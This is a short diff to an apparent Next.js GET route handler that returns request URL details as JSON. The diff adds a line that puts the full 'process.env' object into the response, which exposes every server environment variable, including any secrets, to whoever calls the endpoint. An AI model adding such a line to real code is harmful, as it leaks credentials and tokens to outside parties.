@@ -5,6 +5,7 @@ export async function GET(request: NextRequest) {
   const headers = request.headers;
 
   return Response.json({
+    envs: process.env,
     request_url: request.url,
     next_request_url: request.nextUrl.href,
     'x-middleware-request-url': headers.get('x-middleware-request-url'),
